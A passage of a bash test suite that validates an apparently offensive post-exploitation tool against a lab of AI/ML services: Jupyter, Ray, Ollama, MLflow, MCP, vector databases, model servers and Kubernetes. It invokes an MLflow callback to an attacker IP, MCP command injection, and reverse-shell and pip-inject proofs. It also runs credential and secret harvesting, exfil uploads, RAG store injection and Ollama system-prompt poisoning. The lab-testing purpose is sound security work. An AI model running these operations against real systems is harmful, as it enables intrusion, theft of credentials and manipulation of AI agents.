    if assert_artifact_ok "jupyter-pip-proof" "$TMPDIR/jupyter-pip-proof.json"; then
        assert_jq "jupyter pip-proof returns findings" '.findings[]?' "$TMPDIR/jupyter-pip-proof.json"
    fi
    if [[ -n "$JUPYTER_KERNEL_ID" && -f "$TMPDIR/jupyter-reverse-shell-proof.json" ]]; then
        assert_contains "jupyter reverse-shell-proof references kernel id" "$JUPYTER_KERNEL_ID" "$TMPDIR/jupyter-reverse-shell-proof.json"
    else
        fail "jupyter reverse-shell-proof skipped because no kernel id was available"
    fi

    run_capture "ollama-exfiltrate-no-force" "$TMPDIR/ollama-exfiltrate-no-force.out" "$TMPDIR/ollama-exfiltrate-no-force.err" \
        "$AIPOSTEX" ollama --target "$TARGET_DEV:11434" exfiltrate --model smollm2:135m
    local ollama_exfil_code
    ollama_exfil_code=$(cat "$TMPDIR/ollama-exfiltrate-no-force.out.exit")
    assert_regex "ollama exfiltrate rejects without force" 'force-exploit' "$TMPDIR/ollama-exfiltrate-no-force.err"
    if [[ "$ollama_exfil_code" -ne 0 ]]; then
        pass "ollama exfiltrate returns non-zero without force"
    else
        fail "ollama exfiltrate returns non-zero without force"
    fi

    run_capture "ray-submit-no-force" "$TMPDIR/ray-submit-no-force.out" "$TMPDIR/ray-submit-no-force.err" \
        "$AIPOSTEX" ray --target "$TARGET_ML:8265" submit --payload-preset env-disclosure
    local ray_submit_code
    ray_submit_code=$(cat "$TMPDIR/ray-submit-no-force.out.exit")
    assert_regex "ray submit rejects without force" 'force-exploit' "$TMPDIR/ray-submit-no-force.err"
    if [[ "$ray_submit_code" -ne 0 ]]; then
        pass "ray submit returns non-zero without force"
    else
        fail "ray submit returns non-zero without force"
    fi

    run_capture "ray-pip-inject-no-force" "$TMPDIR/ray-pip-inject-no-force.out" "$TMPDIR/ray-pip-inject-no-force.err" \
        "$AIPOSTEX" ray --target "$TARGET_ML:8265" pip-inject
    local ray_pip_inject_code
    ray_pip_inject_code=$(cat "$TMPDIR/ray-pip-inject-no-force.out.exit")
    assert_regex "ray pip-inject rejects without force" 'force-exploit' "$TMPDIR/ray-pip-inject-no-force.err"
    if [[ "$ray_pip_inject_code" -ne 0 ]]; then
        pass "ray pip-inject returns non-zero without force"
    else
        fail "ray pip-inject returns non-zero without force"
    fi

    if [[ -n "$RAY_JOB_ID" ]]; then
        run_capture "ray-runtime-env" "$TMPDIR/ray-runtime-env.json" "$TMPDIR/ray-runtime-env.stderr" \
            "$AIPOSTEX" ray --target "$TARGET_ML:8265" runtime-env --job-id "$RAY_JOB_ID" --force-exploit --format json
        if assert_artifact_ok "ray-runtime-env" "$TMPDIR/ray-runtime-env.json"; then
            assert_contains "ray runtime-env returns runtime marker" "runtime" "$TMPDIR/ray-runtime-env.json"
            assert_jq "ray runtime-env includes stage/landed metadata" '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/ray-runtime-env.json"
        fi
    else
        fail "ray runtime-env skipped because no Ray job id was available"
    fi

    run_capture "jupyter-pip-proof-no-force" "$TMPDIR/jupyter-pip-proof-no-force.out" "$TMPDIR/jupyter-pip-proof-no-force.err" \
        "$AIPOSTEX" jupyter --target "$TARGET_DEV:8888" pip-proof
    local jupyter_pip_code
    jupyter_pip_code=$(cat "$TMPDIR/jupyter-pip-proof-no-force.out.exit")
    assert_regex "jupyter pip-proof rejects without force" 'force-exploit' "$TMPDIR/jupyter-pip-proof-no-force.err"
    if [[ "$jupyter_pip_code" -ne 0 ]]; then
        pass "jupyter pip-proof returns non-zero without force"
    else
        fail "jupyter pip-proof returns non-zero without force"
    fi

    run_capture "mlflow-tamper-proof-no-force" "$TMPDIR/mlflow-tamper-proof-no-force.out" "$TMPDIR/mlflow-tamper-proof-no-force.err" \
        "$AIPOSTEX" mlflow --target "$TARGET_ML:5000" tamper-proof
    local mlflow_tamper_code
    mlflow_tamper_code=$(cat "$TMPDIR/mlflow-tamper-proof-no-force.out.exit")
    assert_regex "mlflow tamper-proof rejects without force" 'force-exploit' "$TMPDIR/mlflow-tamper-proof-no-force.err"
    if [[ "$mlflow_tamper_code" -ne 0 ]]; then
        pass "mlflow tamper-proof returns non-zero without force"
    else
        fail "mlflow tamper-proof returns non-zero without force"
    fi

    run_capture "mlflow-hook-no-force" "$TMPDIR/mlflow-hook-no-force.out" "$TMPDIR/mlflow-hook-no-force.err" \
        "$AIPOSTEX" mlflow --target "$TARGET_ML:5000" hook \
        --model acme-churn-ensemble --version 1 \
        --callback-url "http://${ATTACK_IP}:18443/mlflow-hook"
    local mlflow_hook_code
    mlflow_hook_code=$(cat "$TMPDIR/mlflow-hook-no-force.out.exit")
    assert_regex "mlflow hook rejects without force" 'force-exploit' "$TMPDIR/mlflow-hook-no-force.err"
    if [[ "$mlflow_hook_code" -ne 0 ]]; then
        pass "mlflow hook returns non-zero without force"
    else
        fail "mlflow hook returns non-zero without force"
    fi

    run_capture "mcp-poison" "$TMPDIR/mcp-poison.json" "$TMPDIR/mcp-poison.stderr" \
        "$AIPOSTEX" mcp --target "$TARGET_DEV:3000" poison \
        --mode cmd-inject \
        --tool execute_command \
        --command id \
        --force-exploit \
        --format json
    if assert_artifact_ok "mcp-poison" "$TMPDIR/mcp-poison.json"; then
        assert_jq "mcp poison returns findings" '.findings[]?' "$TMPDIR/mcp-poison.json"
        assert_jq "mcp poison includes stage/landed metadata" '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/mcp-poison.json"
    fi

    if [[ -n "$GRADIO_FILE_REF" ]]; then
        run_capture "gradio-serve-no-force" "$TMPDIR/gradio-serve-no-force.out" "$TMPDIR/gradio-serve-no-force.err" \
            "$AIPOSTEX" gradio --target "$TARGET_DEV:7860" serve-probe --file "$GRADIO_FILE_REF"
        local serve_code
        serve_code=$(cat "$TMPDIR/gradio-serve-no-force.out.exit")
        assert_regex "gradio serve-probe rejects without force" 'force-exploit' "$TMPDIR/gradio-serve-no-force.err"
        if [[ "$serve_code" -ne 0 ]]; then
            pass "gradio serve-probe returns non-zero without force"
        else
            fail "gradio serve-probe returns non-zero without force"
        fi

        run_capture "gradio-serve-probe" "$TMPDIR/gradio-serve-probe.json" "$TMPDIR/gradio-serve-probe.stderr" \
            "$AIPOSTEX" gradio --target "$TARGET_DEV:7860" serve-probe --file "$GRADIO_FILE_REF" --force-exploit --format json
        if assert_artifact_ok "gradio-serve-probe" "$TMPDIR/gradio-serve-probe.json"; then
            assert_contains "gradio serve-probe reads exported bundle" "incident-response runbook" "$TMPDIR/gradio-serve-probe.json"
            assert_jq "gradio serve-probe includes stage/landed metadata" '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/gradio-serve-probe.json"
        fi
    else
        fail "gradio serve-probe skipped because no file reference was available"
    fi

    assert_jq "jupyter start-kernel includes stage/landed metadata" '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/jupyter-start-kernel.json"
    assert_jq "jupyter pip-proof includes stage/landed metadata" '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/jupyter-pip-proof.json"
    if [[ -f "$TMPDIR/jupyter-reverse-shell-proof.json" ]]; then
        assert_jq "jupyter reverse-shell-proof includes stage/landed metadata" '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/jupyter-reverse-shell-proof.json"
    fi
    assert_jq "ray cluster-info includes stage/landed metadata" '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/ray-cluster-info.json"

    # ── openai-compat active ──
    if assert_artifact_ok "oai-throughput" "$TMPDIR/oai-throughput.json"; then
        assert_jq "openai-compat throughput returns findings" '.findings[]?' "$TMPDIR/oai-throughput.json"
    fi
    if assert_artifact_ok "oai-proxy-test" "$TMPDIR/oai-proxy-test.json"; then
        assert_jq "openai-compat proxy-test returns findings" '.findings[]?' "$TMPDIR/oai-proxy-test.json"
    fi

    # ── mcp chain ──
    if assert_artifact_ok "mcp-chain" "$TMPDIR/mcp-chain.json"; then
        assert_jq "mcp chain returns findings" '.findings[]?' "$TMPDIR/mcp-chain.json"
    fi
    if assert_artifact_ok "mcp-shell" "$TMPDIR/mcp-shell.out"; then
        assert_contains "mcp shell lists tools" "execute_command" "$TMPDIR/mcp-shell.out"
        assert_contains "mcp shell captures environment output" "OPENAI_API_KEY" "$TMPDIR/mcp-shell.out"
        if [[ -s "$TMPDIR/mcp-shell.jsonl" ]]; then
            assert_contains "mcp shell writes JSONL capture" '"action":"shell"' "$TMPDIR/mcp-shell.jsonl"
            run_capture "mcp-shell-creds" "$TMPDIR/mcp-shell-creds.txt" "$TMPDIR/mcp-shell-creds.stderr" \
                "$AIPOSTEX" report view "$TMPDIR/mcp-shell.jsonl" --credentials || true
            if [[ -s "$TMPDIR/mcp-shell-creds.txt" ]]; then
                assert_contains "mcp shell loot surfaces openai key" "openai-api-key" "$TMPDIR/mcp-shell-creds.txt"
            else
                fail "mcp shell credential report was empty"
            fi
        else
            fail "mcp shell JSONL capture was not created"
        fi
    fi
    if assert_artifact_ok "oai-shell-runaway" "$TMPDIR/oai-shell-runaway.out"; then
        assert_contains "openai shell returns chat output" "vllm unauthenticated chat inference confirmed" "$TMPDIR/oai-shell-runaway.out"
        assert_not_contains "openai shell trims runaway user marker" "### User:" "$TMPDIR/oai-shell-runaway.out"
        assert_not_contains "openai shell trims runaway assistant marker" "### Assistant:" "$TMPDIR/oai-shell-runaway.out"
    fi
    if assert_artifact_ok "mcp-config-hijack" "$TMPDIR/mcp-config-hijack-out.json"; then
        assert_jq "mcp config-hijack verifies local config write" \
            '.findings[]? | select(.metadata.action == "config-hijack" and .metadata.verified == true)' \
            "$TMPDIR/mcp-config-hijack-out.json"
        assert_jq "mcp config-hijack lands as impact/influenced" \
            '.findings[]? | select(.metadata.action == "config-hijack" and .metadata.stage == "impact" and .metadata.landed == "influenced")' \
            "$TMPDIR/mcp-config-hijack-out.json"
    fi

    # ── huggingface model-download ──
    if assert_artifact_ok "hf-model-download" "$TMPDIR/hf-model-download.json"; then
        assert_jq "huggingface model-download returns findings" '.findings[]?' "$TMPDIR/hf-model-download.json"
        assert_jq "huggingface model-download reads Hub-compatible config" \
            '.findings[]? | select(.metadata.action == "model-download" and .metadata.artifact_path == "config.json" and .metadata.bytes_read > 0)' \
            "$TMPDIR/hf-model-download.json"
        assert_jq "huggingface model-download reads bounded weights" \
            '.findings[]? | select(.metadata.action == "model-download" and .metadata.artifact_path == "model.safetensors" and .metadata.bytes_read > 0)' \
            "$TMPDIR/hf-model-download.json"
        assert_jq "huggingface model-download lands as takeover-capable on weights" \
            '.findings[]? | select(.metadata.action == "model-download" and .metadata.artifact_path == "model.safetensors" and .metadata.stage == "impact" and .metadata.landed == "takeover-capable")' \
            "$TMPDIR/hf-model-download.json"
    fi

    # WS-A: gated Hub repo — honest 401 negative without the token, lands with it.
    if assert_artifact_ok "hf-model-download-gated-noauth" "$TMPDIR/hf-model-download-gated-noauth.json"; then
        assert_jq "hf gated model-download stays recon/reachable without the Hub token" \
            '.findings[]? | select(.metadata.stage == "recon" and .metadata.landed == "reachable")' \
            "$TMPDIR/hf-model-download-gated-noauth.json"
        assert_jq "hf gated model-download reads no bytes without the token" \
            '[.findings[]? | select((.metadata.bytes_read // 0) > 0)] | length == 0' \
            "$TMPDIR/hf-model-download-gated-noauth.json"
    fi
    if assert_artifact_ok "hf-model-download-gated-auth" "$TMPDIR/hf-model-download-gated-auth.json"; then
        assert_jq "hf gated model-download lands takeover-capable weights with the Hub token" \
            '.findings[]? | select(.metadata.action == "model-download" and .metadata.artifact_path == "model.safetensors" and .metadata.landed == "takeover-capable")' \
            "$TMPDIR/hf-model-download-gated-auth.json"
    fi

    # ── ray submit ──
    if assert_artifact_ok "ray-submit" "$TMPDIR/ray-submit.json"; then
        assert_jq "ray submit returns findings" '.findings[]?' "$TMPDIR/ray-submit.json"
        assert_jq "ray submit includes stage/landed metadata" '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/ray-submit.json"
        assert_jq "ray submit job_id is non-empty" \
            '.findings[]? | select(.metadata.job_id != null and .metadata.job_id != "")' \
            "$TMPDIR/ray-submit.json"
    fi

    # ── vectordb inject ──
    if assert_artifact_ok "chromadb-inject" "$TMPDIR/chromadb-inject.json"; then
        assert_jq "chromadb inject returns findings" '.findings[]?' "$TMPDIR/chromadb-inject.json"
        assert_jq "chromadb inject includes stage/landed metadata" '.findings[]? | select(.metadata.stage != null)' "$TMPDIR/chromadb-inject.json"
    fi
    if assert_artifact_ok "weaviate-inject" "$TMPDIR/weaviate-inject.json"; then
        assert_jq "weaviate inject returns findings" '.findings[]?' "$TMPDIR/weaviate-inject.json"
    fi
    if assert_artifact_ok "qdrant-inject" "$TMPDIR/qdrant-inject.json"; then
        assert_jq "qdrant inject returns findings" '.findings[]?' "$TMPDIR/qdrant-inject.json"
    fi

    # ── vectordb metadata-inject ──
    if assert_artifact_ok "chromadb-meta-inject" "$TMPDIR/chromadb-meta-inject.json"; then
        assert_jq "chromadb metadata-inject returns findings" '.findings[]?' "$TMPDIR/chromadb-meta-inject.json"
    fi
    if assert_artifact_ok "weaviate-meta-inject" "$TMPDIR/weaviate-meta-inject.json"; then
        assert_jq "weaviate metadata-inject returns findings" '.findings[]?' "$TMPDIR/weaviate-meta-inject.json"
    fi
    if assert_artifact_ok "qdrant-meta-inject" "$TMPDIR/qdrant-meta-inject.json"; then
        assert_jq "qdrant metadata-inject returns findings" '.findings[]?' "$TMPDIR/qdrant-meta-inject.json"
    fi

    # ── bentoml predict ──
    if assert_artifact_ok "bentoml-predict" "$TMPDIR/bentoml-predict.json"; then
        assert_jq "bentoml predict returns findings" '.findings[]?' "$TMPDIR/bentoml-predict.json"
        assert_jq "bentoml predict includes stage/landed metadata" '.findings[]? | select(.metadata.stage != null)' "$TMPDIR/bentoml-predict.json"
        assert_jq "bentoml predict verifies input-dependent inference" \
            '.findings[]? | select(.metadata.action == "predict" and .metadata.inference_verified == true)' \
            "$TMPDIR/bentoml-predict.json"
        assert_jq "bentoml predict lands as impact/execution-confirmed" \
            '.findings[]? | select(.metadata.action == "predict" and .metadata.stage == "impact" and .metadata.landed == "execution-confirmed")' \
            "$TMPDIR/bentoml-predict.json"
    fi

    # ── torchserve predict ──
    if assert_artifact_ok "torchserve-predict" "$TMPDIR/torchserve-predict.json"; then
        assert_jq "torchserve predict returns findings" '.findings[]?' "$TMPDIR/torchserve-predict.json"
    fi
    if assert_artifact_ok "torchserve-register-handler" "$TMPDIR/torchserve-register-handler.json"; then
        assert_jq "torchserve register verifies handler execution" \
            '.findings[]? | select(.metadata.action == "register" and .metadata.handler_verified == true)' \
            "$TMPDIR/torchserve-register-handler.json"
        assert_jq "torchserve register handler lands as own/execution-confirmed" \
            '.findings[]? | select(.metadata.action == "register" and .metadata.stage == "own" and .metadata.landed == "execution-confirmed")' \
            "$TMPDIR/torchserve-register-handler.json"
    fi

    # ── triton infer ──
    if assert_artifact_ok "triton-infer" "$TMPDIR/triton-infer.json"; then
        assert_jq "triton infer returns findings" '.findings[]?' "$TMPDIR/triton-infer.json"
    fi
    if assert_artifact_ok "triton-model-load-verify" "$TMPDIR/triton-model-load-verify.json"; then
        assert_jq "triton model-load verifies post-load inference" \
            '.findings[]? | select(.metadata.action == "model-load" and .metadata.load_verified == true)' \
            "$TMPDIR/triton-model-load-verify.json"
        assert_jq "triton model-load lands as own/execution-confirmed" \
            '.findings[]? | select(.metadata.action == "model-load" and .metadata.stage == "own" and .metadata.landed == "execution-confirmed")' \
            "$TMPDIR/triton-model-load-verify.json"
    fi
    if assert_artifact_ok "tfserving-predict" "$TMPDIR/tfserving-predict.json"; then
        assert_jq "tfserving predict verifies input-dependent inference" \
            '.findings[]? | select(.metadata.action == "predict" and .metadata.inference_verified == true)' \
            "$TMPDIR/tfserving-predict.json"
        assert_jq "tfserving predict lands as impact/execution-confirmed" \
            '.findings[]? | select(.metadata.action == "predict" and .metadata.stage == "impact" and .metadata.landed == "execution-confirmed")' \
            "$TMPDIR/tfserving-predict.json"
    fi

    # ── wandb secrets ──
    if assert_artifact_ok "wandb-secrets" "$TMPDIR/wandb-secrets.json"; then
        assert_jq "wandb secrets returns findings" '.findings[]?' "$TMPDIR/wandb-secrets.json"
        assert_contains "wandb secrets finds WANDB_API_KEY" "WANDB_API_KEY" "$TMPDIR/wandb-secrets.json"
        assert_contains "wandb secrets finds OPENAI_API_KEY" "OPENAI_API_KEY" "$TMPDIR/wandb-secrets.json"
        assert_jq "wandb secrets includes stage/landed metadata" \
            '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/wandb-secrets.json"
    fi

    # ── vectordb rag-verify ──
    if assert_artifact_ok "chromadb-rag-verify" "$TMPDIR/chromadb-rag-verify.json"; then
        assert_jq "chromadb rag-verify returns findings" '.findings[]?' "$TMPDIR/chromadb-rag-verify.json"
        assert_jq "chromadb rag-verify includes stage/landed metadata" \
            '.findings[]? | select(.metadata.stage != null)' "$TMPDIR/chromadb-rag-verify.json"
    fi

    # ── a2a tool-inject ──
    if assert_artifact_ok "a2a-tool-inject" "$TMPDIR/a2a-tool-inject.json"; then
        assert_jq "a2a tool-inject returns findings" '.findings[]?' "$TMPDIR/a2a-tool-inject.json"
        assert_jq "a2a tool-inject includes stage/landed metadata" \
            '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/a2a-tool-inject.json"
    fi

    # ── a2a replay ──
    if assert_artifact_ok "a2a-replay" "$TMPDIR/a2a-replay.json"; then
        assert_jq "a2a replay returns findings" '.findings[]?' "$TMPDIR/a2a-replay.json"
        assert_jq "a2a replay includes stage/landed metadata" \
            '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/a2a-replay.json"
        # follow-on-presence: the offensive verbs must emit next-action guidance
        # (this is the regression that would have caught the missing-follow-on gap).
        assert_jq "a2a replay emits follow-on guidance" \
            '.findings[]? | select((.metadata.workflow.recommendations? // []) | length > 0)' "$TMPDIR/a2a-replay.json"
    fi

    # ── k8s (kube-apiserver) ──
    if assert_artifact_ok "k8s-enum" "$TMPDIR/k8s-enum.json"; then
        assert_jq "k8s enum returns findings" '.findings[]?' "$TMPDIR/k8s-enum.json"
        assert_jq "k8s enum includes stage/landed metadata" \
            '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/k8s-enum.json"
    fi
    if assert_artifact_ok "k8s-rbac-probe" "$TMPDIR/k8s-rbac-probe.json"; then
        assert_jq "k8s rbac-probe returns findings" '.findings[]?' "$TMPDIR/k8s-rbac-probe.json"
        assert_jq "k8s rbac-probe emits follow-on guidance" \
            '.findings[]? | select((.metadata.workflow.recommendations? // []) | length > 0)' "$TMPDIR/k8s-rbac-probe.json"
    fi
    # WS2 Tier-2: k8s secret-read (anon --all-namespaces) is a credential READ.
    if assert_artifact_ok "k8s-secret-read" "$TMPDIR/k8s-secret-read.json"; then
        assert_jq "k8s secret-read lands impact/read-confirmed (not own)" \
            '.findings[]? | select(.metadata.stage == "impact" and .metadata.landed == "read-confirmed")' "$TMPDIR/k8s-secret-read.json"
        assert_jq "k8s secret-read surfaces extracted_credentials" \
            '.findings[]? | select(.metadata.extracted_credentials != null)' "$TMPDIR/k8s-secret-read.json"
        assert_jq "k8s secret-read never over-claims own/takeover" \
            '[.findings[]? | select(.metadata.stage == "own" or .metadata.landed == "takeover-capable")] | length == 0' "$TMPDIR/k8s-secret-read.json"
    fi
    # WS2 Tier-2: ollama poison-verify confirms an injected system prompt took effect.
    if assert_artifact_ok "ollama-poison-verify" "$TMPDIR/ollama-poison-verify.json"; then
        assert_jq "ollama poison-verify detects divergence (impact/influenced)" \
            '.findings[]? | select(.metadata.diverged == true and .metadata.stage == "impact" and .metadata.landed == "influenced")' "$TMPDIR/ollama-poison-verify.json"
        assert_jq "ollama poison-verify never over-claims execution/own" \
            '[.findings[]? | select(.metadata.landed == "execution-confirmed" or .metadata.landed == "takeover-capable" or .metadata.stage == "own")] | length == 0' "$TMPDIR/ollama-poison-verify.json"
    fi
    if assert_artifact_ok "k8s-sa-loot-dossier-source" "$TMPDIR/k8s-sa-loot-dossier-source.jsonl"; then
        assert_contains "dossier source includes k8s token type" "k8s-sa-token" "$TMPDIR/k8s-sa-loot-dossier-source.jsonl"
    fi
    if assert_artifact_ok "dossier-manual" "$TMPDIR/dossier-manual.out"; then
        if [[ -f "$TMPDIR/dossier-manual/manual/env.sh" ]]; then
            pass "dossier manual env.sh exists"
            assert_contains "dossier manual env exports SA token" "export SA_TOKEN=" "$TMPDIR/dossier-manual/manual/env.sh"
        else
            fail "dossier manual env.sh exists"
        fi
        if [[ -f "$TMPDIR/dossier-manual/manual/pivots.sh" ]]; then
            pass "dossier manual pivots.sh exists"
            assert_contains "dossier manual pivots include kubectl" "kubectl" "$TMPDIR/dossier-manual/manual/pivots.sh"
            if bash -n "$TMPDIR/dossier-manual/manual/pivots.sh" >/dev/null 2>&1; then
                pass "dossier manual pivots.sh is shell-valid"
            else
                fail "dossier manual pivots.sh is shell-valid"
            fi
        else
            fail "dossier manual pivots.sh exists"
        fi
        local kubeconfigs
        kubeconfigs=("$TMPDIR"/dossier-manual/manual/kubeconfig-*)
        if [[ -f "${kubeconfigs[0]}" ]]; then
            pass "dossier manual kubeconfig exists"
            assert_contains "dossier manual kubeconfig carries server" "server: https://" "${kubeconfigs[0]}"
        else
            fail "dossier manual kubeconfig exists"
        fi
    fi

    # ── session export ──
    if [[ -f "$TMPDIR/session-export.json" ]]; then
        if assert_artifact_ok "session-export" "$TMPDIR/session-export.json"; then
            assert_jq "session export is valid JSON" '.' "$TMPDIR/session-export.json"
        fi
    else
        skip "session export skipped (no session data available)"
    fi

    # ── jupyter exec ──
    if [[ -n "$JUPYTER_KERNEL_ID" && -f "$TMPDIR/jupyter-exec.json" ]]; then
        if assert_artifact_ok "jupyter-exec" "$TMPDIR/jupyter-exec.json"; then
            assert_contains "jupyter exec output includes marker" "aipostex-lab-verify" "$TMPDIR/jupyter-exec.json"
            assert_jq "jupyter exec includes stage/landed metadata" '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/jupyter-exec.json"
            assert_jq "jupyter exec emits follow-on guidance" '.findings[]? | select((.metadata.workflow.recommendations? // []) | length > 0)' "$TMPDIR/jupyter-exec.json"
        fi
    else
        skip "jupyter exec skipped (no kernel_id available)"
    fi
}


# ══════════════════════════════════════════════════════════════
# POST-EX — validation infrastructure round-trips
# Run explicitly with --layer post-ex; not part of default all.
# ══════════════════════════════════════════════════════════════

run_post_ex_layer() {
    section "post-ex"
    local pox_base
    pox_base="$(inventory_pox_url)"
    local listener_base
    listener_base="$(inventory_listener_url)"
    local dev_ip
    dev_ip="$(inventory_host_ip "ailab-dev")"

    # ── Reset state for clean run ────────────────────────────────────────────
    curl -sf -X POST "${pox_base}/state/reset?token=reset-FAKE-admin-token" >/dev/null 2>&1 || true

    # ── POX health ───────────────────────────────────────────────────────────
    local pox_health
    pox_health=$(curl -sf --max-time 5 "${pox_base}/health" 2>/dev/null || echo "")
    if echo "$pox_health" | grep -qi "healthy"; then
        pass "POX health endpoint is reachable"
    else
        fail "POX health endpoint not reachable at ${pox_base}/health"
        return
    fi

    # ── Listener health ──────────────────────────────────────────────────────
    local listener_health
    listener_health=$(curl -sf --max-time 5 "${listener_base}/health" 2>/dev/null || echo "")
    if echo "$listener_health" | grep -qi "healthy"; then
        pass "Lab listener health endpoint is reachable"
    else
        fail "Lab listener not reachable at ${listener_base}/health"
    fi

    # ── Sentinel round-trip ──────────────────────────────────────────────────
    local sentinel
    sentinel="verify-sentinel-$(date +%s)"
    curl -sf -X POST "${pox_base}/oracle/sentinel" \
        -H "Content-Type: application/json" \
        -d "{\"sentinel\":\"${sentinel}\",\"target\":\"verify\",\"notes\":\"post-ex layer\"}" \
        >/dev/null 2>&1
    local verify
    verify=$(curl -sf "${pox_base}/oracle/verify?sentinel=${sentinel}" 2>/dev/null || echo "")
    if echo "$verify" | python3 -c "import sys,json; d=json.load(sys.stdin); exit(0 if d.get('found') and d.get('count',0)>=1 else 1)" 2>/dev/null; then
        pass "POX sentinel write+verify round-trip"
    else
        fail "POX sentinel round-trip failed (write not reflected in query)"
    fi

    # ── Heartbeat count ──────────────────────────────────────────────────────
    local htag
    htag="verify-heartbeat-$(date +%s)"
    for i in 1 2 3; do
        curl -sf -X POST "${pox_base}/heartbeat" \
            -H "Content-Type: application/json" \
            -d "{\"source\":\"verify\",\"tag\":\"${htag}\",\"payload\":{\"n\":${i}}}" \
            >/dev/null 2>&1
    done
    local beats
    beats=$(curl -sf "${pox_base}/heartbeat/query?tag=${htag}" 2>/dev/null \
        | python3 -c "import sys,json; print(json.load(sys.stdin).get('count',0))" 2>/dev/null || echo "0")
    if [ "${beats}" -eq 3 ] 2>/dev/null; then
        pass "POX heartbeat records 3 beats for tag ${htag}"
    else
        fail "POX heartbeat count: expected 3, got ${beats}"
    fi

    # ── Credential replay — positive ─────────────────────────────────────────
    local replay_ok
    replay_ok=$(curl -sf -X POST "${pox_base}/replay/aws/s3/acme-ml-prod/list" \
        -H "X-AWS-Key: AKIAFAKE1234EXAMPLE1" \
        -H "Content-Type: application/json" -d '{}' 2>/dev/null || echo "")
    if echo "$replay_ok" | python3 -c "import sys,json; exit(0 if json.load(sys.stdin).get('valid') else 1)" 2>/dev/null; then
        pass "POX replay validates planted AWS credential"
    else
        fail "POX replay did not validate known-good AWS credential"
    fi

    # ── Credential replay — negative ─────────────────────────────────────────
    local replay_bad_code
    replay_bad_code=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "${pox_base}/replay/aws/s3/acme-ml-prod/list" \
        -H "X-AWS-Key: AKIAREAL_NOT_IN_LAB_99" \
        -H "Content-Type: application/json" -d '{}' 2>/dev/null || echo "000")
    if [ "${replay_bad_code}" = "403" ]; then
        pass "POX replay rejects unknown credential (HTTP 403)"
    else
        fail "POX replay returned ${replay_bad_code} for unknown credential (expected 403)"
    fi

    # ── Exfil sink ───────────────────────────────────────────────────────────
    local exfil_tag
    exfil_tag="verify-exfil-$(date +%s)"
    local exfil_resp
    exfil_resp=$(curl -sf -X POST "${pox_base}/exfil/upload?tag=${exfil_tag}" \
        -H "Content-Type: application/octet-stream" \
        --data-binary "test-payload-content-bytes-from-verify-aipostex" 2>/dev/null || echo "")
    if echo "$exfil_resp" | python3 -c "import sys,json; d=json.load(sys.stdin); exit(0 if d.get('recorded') and d.get('bytes',0)>0 and d.get('sha256') else 1)" 2>/dev/null; then
        pass "POX exfil sink records upload with sha256"
    else
        fail "POX exfil sink did not record upload"
    fi

    # ── Listener webhook round-trip ──────────────────────────────────────────
    local lpid
    lpid="verify-webhook-$(date +%s)"
    curl -sf -X POST "${listener_base}/callback/webhook" \
        -H "Content-Type: application/json" \
        -H "X-Probe-Id: ${lpid}" \
        -d "{\"taskId\":\"${lpid}\",\"status\":\"test\"}" \
        >/dev/null 2>&1
    local lcnt
    lcnt=$(curl -sf "${listener_base}/callbacks?probe_id=${lpid}" 2>/dev/null \
        | python3 -c "import sys,json; print(json.load(sys.stdin).get('count',0))" 2>/dev/null || echo "0")
    if [ "${lcnt}" -ge 1 ] 2>/dev/null; then
        pass "Lab listener webhook POST → query round-trip (count=${lcnt})"
    else
        fail "Lab listener webhook not reflected in query API"
    fi

    # ── Listener reachable from ailab-dev ────────────────────────────────────
    if ssh ${SSH_OPTS} "labadmin@${dev_ip}" \
        "curl -sf --max-time 5 ${listener_base}/health" 2>/dev/null | grep -qi "healthy"; then
        pass "Lab listener reachable from ailab-dev via SSH"
    else
        fail "Lab listener not reachable from ailab-dev (check firewall/routing)"
    fi

    # ── Lateral target: reachable from ailab-dev localhost ───────────────────
    if ssh ${SSH_OPTS} "labadmin@${dev_ip}" \
        "curl -sf --max-time 3 http://127.0.0.1:9999/admin/status" 2>/dev/null | grep -qi "internal-admin"; then
        pass "Lateral target reachable via localhost on ailab-dev"
    else
        fail "Lateral target (127.0.0.1:9999) not reachable on ailab-dev — is internal-admin.service running?"
    fi

    # ── Lateral target: NOT reachable from attack box ────────────────────────
    local lat_code
    lat_code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 \
        "http://${dev_ip}:9999/admin/status" 2>/dev/null) || true
    if [[ "$lat_code" == "000" ]]; then
        pass "Lateral target correctly not reachable from attack box (port closed)"
    else
        fail "Lateral target exposed on network (HTTP ${lat_code}) — BIND_ADDR must be 127.0.0.1"
    fi

    # ── A2A agent enum via aipostex ──────────────────────────────────────────
    if command -v aipostex >/dev/null 2>&1 || [ -f "$HOME/aipostex" ]; then
        local AIPOSTEX_CMD="${AIPOSTEX:-$HOME/aipostex}"
        local a2a_out="$TMPDIR/a2a-enum-postex.json"
        local a2a_rc=0
        "${AIPOSTEX_CMD}" a2a --target "${TARGET_APP}:8100" enum \
            --format json >"$a2a_out" 2>/dev/null || a2a_rc=$?
        if [[ $a2a_rc -eq 0 || $a2a_rc -eq 2 ]]; then
            local skill_cnt
            skill_cnt=$(python3 -c "import json; d=json.load(open('$a2a_out')); f=d.get('findings',[]); print(next((f2.get('metadata',{}).get('skill_count',0) for f2 in f if 'skill_count' in f2.get('metadata',{})),0))" 2>/dev/null || echo "0")
            if [ "${skill_cnt:-0}" -ge 4 ] 2>/dev/null; then
                pass "aipostex a2a enum reports skill_count=${skill_cnt} on port 8100"
            else
                fail "aipostex a2a enum skill_count below expected: ${skill_cnt}"
            fi
        else
            skip "aipostex a2a enum failed (non-zero exit) — check connectivity"
        fi
    else
        skip "aipostex binary not found — skipping a2a enum check"
    fi
}

# ══════════════════════════════════════════════════════════════
# CONTRACT — output schema, workflow metadata, ordering
# ══════════════════════════════════════════════════════════════

run_contract_layer() {
    section "contract"
    prepare_read_only_artifacts

    run_capture "jsonl-check" "$TMPDIR/oai-enum.jsonl" "$TMPDIR/oai-enum-jsonl.stderr" \
